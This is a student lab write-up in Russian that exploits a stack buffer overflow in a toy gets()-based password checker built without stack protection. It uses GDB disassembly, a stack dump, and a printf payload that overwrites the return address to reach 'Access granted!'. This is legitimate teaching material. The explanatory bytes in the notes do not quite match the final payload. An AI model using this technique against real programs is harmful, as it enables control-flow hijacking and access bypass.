# 5 - Перезаписать адрес возврата

## Задание
2. Имеется программа (исходный код которой приводится ниже,
компилировать с ключами: -fno-stack-protector -no-pie). Вам необходимо
произвести анализ программы с помощью отладчика для выяснения длины
массива для ввода пароля и адреса ветки условия проверки корректности
ввода пароля, которая выполняется при условии совпадения паролей.
Ввести пароль (строку символов)таким образом, чтобы перезаписать адрес
возврата на выясненный адрес (есть символы которые нельзя ввести с
клавиатуры, поэтому можно использовать перенаправление ввода(<) при
запуске программы).

> 1. Переписать абонентский справочник с использованием функций. -> уже было сделано (lab-4) 



# 2 Задание по шагам:

1.  С помощью команды disassemble main в GDB находим адрес инструкции, которая выводит сообщение об успешном входе. (0x4011d8)

0x00000000004011bd <+39>:    jne    0x4011d8 <main+66>
0x00000000004011d8 <+66>:    lea    0xe43(%rip),%rax  # "Access granted!"

```c
(gdb) disassemble 
Dump of assembler code for function main:
   0x0000000000401196 <+0>:     endbr64
   0x000000000040119a <+4>:     push   %rbp
   0x000000000040119b <+5>:     mov    %rsp,%rbp
   0x000000000040119e <+8>:     sub    $0x10,%rsp
=> 0x00000000004011a2 <+12>:    lea    0xe5b(%rip),%rax        # 0x402004
   0x00000000004011a9 <+19>:    mov    %rax,%rdi
   0x00000000004011ac <+22>:    call   0x401070 <puts@plt>
   0x00000000004011b1 <+27>:    call   0x4011ee <IsPassOk>
   0x00000000004011b6 <+32>:    mov    %eax,-0x4(%rbp)
   0x00000000004011b9 <+35>:    cmpl   $0x0,-0x4(%rbp)
   0x00000000004011bd <+39>:    jne    0x4011d8 <main+66>
   0x00000000004011bf <+41>:    lea    0xe4e(%rip),%rax        # 0x402014
   0x00000000004011c6 <+48>:    mov    %rax,%rdi
   0x00000000004011c9 <+51>:    call   0x401070 <puts@plt>
   0x00000000004011ce <+56>:    mov    $0x1,%edi
   0x00000000004011d3 <+61>:    call   0x4010a0 <exit@plt>
   0x00000000004011d8 <+66>:    lea    0xe43(%rip),%rax        # 0x402022
   0x00000000004011df <+73>:    mov    %rax,%rdi
   0x00000000004011e2 <+76>:    call   0x401070 <puts@plt>
   0x00000000004011e7 <+81>:    mov    $0x0,%eax
   0x00000000004011ec <+86>:    leave
   0x00000000004011ed <+87>:    ret
End of assembler dump.
```

2. Нужно найти адресс возврата функции: 

```c
(gdb) disassemble 
Dump of assembler code for function IsPassOk:
   0x00000000004011ee <+0>:     endbr64
   0x00000000004011f2 <+4>:     push   %rbp
   0x00000000004011f3 <+5>:     mov    %rsp,%rbp
   0x00000000004011f6 <+8>:     sub    $0x10,%rsp
=> 0x00000000004011fa <+12>:    lea    -0xc(%rbp),%rax
   0x00000000004011fe <+16>:    mov    %rax,%rdi
   0x0000000000401201 <+19>:    mov    $0x0,%eax
   0x0000000000401206 <+24>:    call   0x401090 <gets@plt>
   0x000000000040120b <+29>:    lea    -0xc(%rbp),%rax
   0x000000000040120f <+33>:    lea    0xe1c(%rip),%rdx        # 0x402032
   0x0000000000401216 <+40>:    mov    %rdx,%rsi
   0x0000000000401219 <+43>:    mov    %rax,%rdi
   0x000000000040121c <+46>:    call   0x401080 <strcmp@plt>
   0x0000000000401221 <+51>:    test   %eax,%eax
   0x0000000000401223 <+53>:    sete   %al
```

> Вывели 16 байт регистра rbp
```
(gdb) x/16xb $rbp
0x7fffffffda90: 0xb0 0xda 0xff 0xff 0xff 0x7f 0x00 0x00  # RBP
0x7fffffffda98: 0xb6 0x11 0x40 0x00 0x00 0x00 0x00 0x00  # Оригинальный Ret Address

```

rbp + 8     Нужный нам адресс 0x4011b6 
rbp         RBP
rbp - 12    Массив Pass <- МЫ тут

0x4011b6 нужно заменить на 0x4011d8 который мы нашли, при этом дописать еще 20 байт:

AAAAAAAAAAAAAAAAAAAA - 20 байт мусора (A = \x41..)
00 00 00 00 00 40 11 b6 - перезаписываем первые 4 байта (\xda\x11\x40\x00)


# Результат работы

```bash
make payload # сборка файла с нужным нам текстом
./main < payload.bin  # запуск программы
```

```bash
nm@nm-Aspire-AL15-42P:~/study/eltex/labs/lab-5$ make payload 
/usr/bin/printf "AAAAAAAAAAAAAAAAAAAA\xd8\x11\x40\x00\x00\x00\x00\x00" > payload.bin
nm@nm-Aspire-AL15-42P:~/study/eltex/labs/lab-5$ ./main < payload.bin 
Enter password:
Access granted!
Ошибка шины (образ памяти сброшен на диск)
nm@nm-Aspire-AL15-42P:~/study/eltex/labs/lab-5$ 
```